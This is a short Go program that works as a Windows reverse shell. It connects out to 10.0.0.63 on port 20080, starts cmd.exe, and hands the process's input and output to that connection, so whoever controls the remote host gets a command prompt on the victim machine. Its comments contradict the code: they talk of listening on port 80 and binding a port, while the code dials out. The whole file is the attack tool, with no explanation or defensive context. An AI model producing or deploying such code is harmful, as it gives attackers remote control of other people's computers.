package main

import (
	"net"
	"io"
	"log"
	"os/exec"
)

func main() {
	// Listen on local port 80
	conn, err := net.Dial("tcp", "10.0.0.63:20080")
		if err != nil {
			log.Fatalln("Unable to bind port")
		}
		cmd := exec.Command("cmd.exe", "i")
		// Set stdin to our connection
		rp, wp := io.Pipe()
		cmd.Stdin = conn
		cmd.Stdout = wp
		go io.Copy(conn, rp)
		cmd.Run()
		conn.Close() 
	}
